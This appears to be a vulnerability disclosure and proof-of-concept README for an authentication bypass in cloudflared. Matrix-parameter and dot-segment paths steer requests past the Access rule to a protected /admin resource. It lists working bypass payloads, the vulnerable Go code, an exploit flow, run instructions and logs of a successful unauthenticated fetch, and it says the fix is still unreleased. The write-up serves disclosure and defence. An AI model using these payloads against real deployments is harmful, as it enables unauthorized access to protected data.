# TunnelPicklock — cloudflared Access bypass via matrix-path parameters (VULN-170057)

| | |
|---|---|
| Product + version | cloudflare/cloudflared 2026.10.0–2026.10.7, path normalization enabled (opt-in `--disable-path-normalization=false`, or remotely-managed tunnels with normalization on) |
| CVSS | 6.8 Medium — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| CWE | CWE-862 (Missing Authorization) / CWE-180 (Incorrect Handling of URL Path Separators) |

**Fix:** commit `3106f9499d6a23e2f87ec5267eb4771b507a4d1f` — *"VULN-170057: Don't bypass
access with matrix parameters"* (2026-11-04, Cloudflare's internal VULN- security tracker).
**Unreleased** as of 2026-11-12: the latest public release `2026.10.7` (2026-10-30) predates it.
Vulnerable commit (used by the PoC): `872b241f94871665c1c157adefcf90c11f0ead96` (== tag `2026.10.7`).

## The bug

cloudflared picks the ingress rule for a request by canonicalizing the path and matching rules
in order (`Ingress.FindMatchingRule(hostname, path)`). The vulnerable canonicalization runs on
`url.URL.Path` — which `net/url` has **already percent-decoded** — and does not strip
Servlet-style **matrix parameters** (path segments delimited by `;`):

```go
// vulnerable (ingress/ingress.go @ 872b241f9487)
func canonicalPathForMatching(p string) string {
	if p == "" {
		return "/"
	}
	p = strings.ReplaceAll(p, `\`, "/")
	trailingSlash := strings.HasSuffix(p, "/") ||
		strings.HasSuffix(p, "/.") ||
		strings.HasSuffix(p, "/..")
	cleaned := path.Clean(p)          // matrix parameters are NOT stripped
	if trailingSlash && cleaned != "/" {
		cleaned += "/"
	}
	return cleaned
}
```

Consequences (all demonstrated by the exploit):

| request | cloudflared match (real code) | origin (Servlet-style) serves |
|---|---|---|
| `/public/.;x/../admin` | `path.Clean` pops `.;x` and `..` → `/public/admin` → **non-Access `/public` rule** | `/admin` |
| `/admin;x=%2f..%2fpublic` | `net/url` decodes to `/admin;x=/../public` → `path.Clean` → `/public` → **non-Access `/public` rule** | `/admin` |

The request forwarded to the origin is **never modified** — so a Tomcat/Jetty/Servlet-style
origin (which strips matrix parameters from the raw path before decoding, then resolves
dot-segments) serves the Access-protected `/admin` resource **without any Access
authentication**. That is exactly the bypass Cloudflare fixed in VULN-170057.

## The exploit (real, end-to-end)

```
exploit.py (attacker, this script)
    | GET /admin                     -> 403 (real AccessJWTValidator middleware)
    | GET /public                    -> 200 public page (control)
    | GET /public/.;x/../admin       -> 200 SECRET_ADMIN_DATA_FLAG{TunnelPicklock}
    | GET /admin;x=%2f..%2fpublic    -> 200 SECRET_ADMIN_DATA_FLAG{TunnelPicklock}
    v
driver (Go binary built from the REAL cloudflared module at the vulnerable release)
    * github.com/cloudflare/cloudflared/ingress @ 2026.10.7 (872b241f9487), via go.mod replace
    * real ingress.ParseIngress(config.Configuration) — compiles the path regexps,
      builds the origin services, wires the real Access JWTValidator middleware
    * real ingress.StartOrigins(...) — the origin transports, as cloudflared starts them
    * dispatch = verbatim control flow of proxy/proxy.go @ 872b241:
        FindMatchingRule(r.Host, r.URL.Path) -> rule.Handlers (Access middleware)
        -> rule.Service.RoundTrip(r)          (request path untouched)
    v
Servlet-style origin backend (Python, Tomcat semantics)
    * parsePathParameters-style: strip ';' params per RAW segment BEFORE decoding
    * decode percent-escapes, normalize separators, resolve dot-segments
    * /admin serves the secret and logs the hit
```

The driver log shows the REAL decisions:

```
[driver] GET /admin -> rule #1 (accessRequired=true)
[driver]   filtered by middleware "AccessJWTValidator": no access token in request (403)
[driver] GET /public/.;x/../admin -> rule #0 (accessRequired=false)
[driver] GET /admin;x=%2f..%2fpublic -> rule #0 (accessRequired=false)
backend /admin hits during exploit: 2
EXPLOITED: ... PWNED: backend served SECRET_ADMIN_DATA_FLAG{TunnelPicklock} without any Access JWT.
```

## Run

```
bash run.sh
```

Requirements: `python3`, `go` (any 1.24+; the build downloads the go1.27.3 toolchain into the
module cache on first run because cloudflared 2026.10.7 requires it), and network on first run
only (git clone of the release tag + Go module download; afterwards everything runs offline
from `/home/millie/tmp/audit/{cloudflared-2026.10.7,gomodcache,gocache}`).

## Exploitability assessment

- **AC:H**: the vulnerable normalization is opt-in in all public releases (the VULN-141859
  normalization shipped 2026-09-29 disabled by default, to be enabled in future releases), so
  the affected population today is normalization-enabled deployments. When normalization is
  disabled, the same matrix/dot payloads fall into the older VULN-141859 class, which the flag
  explicitly documents as a risk — the Access-protection contract is breakable either way.
- Requires the origin/downstream hop to use matrix-parameter + dot-segment semantics (Servlet
  containers, Jetty, Tomcat and compatible stacks — extremely common); if the origin treats the
  raw path literally, the bypass is neutralized at the origin level.
- Unauthenticated, single request, no special tooling. High confidentiality impact when the
  protected path serves sensitive data or admin surfaces (S:C because the origin is a different
  security scope than the Access policy).
- Cloudflare has an existing internal track record of this exact class (the in-repo
  `DisablePathNormalization` escape hatch that restores the earlier VULN-141859 bypass).

## References

- Fix commit: https://github.com/cloudflare/cloudflared/commit/3106f9499d6a23e2f87ec5267eb4771b507a4d1f
- Vulnerable release commit: https://github.com/cloudflare/cloudflared/commit/872b241f94871665c1c157adefcf90c11f0ead96
- Vulnerable matcher: https://github.com/cloudflare/cloudflared/blob/872b241f94871665c1c157adefcf90c11f0ead96/ingress/ingress.go
- Proxy dispatch (real flow): https://github.com/cloudflare/cloudflared/blob/872b241f94871665c1c157adefcf90c11f0ead96/proxy/proxy.go
- Latest release (vulnerable): https://github.com/cloudflare/cloudflared/releases/tag/2026.10.7
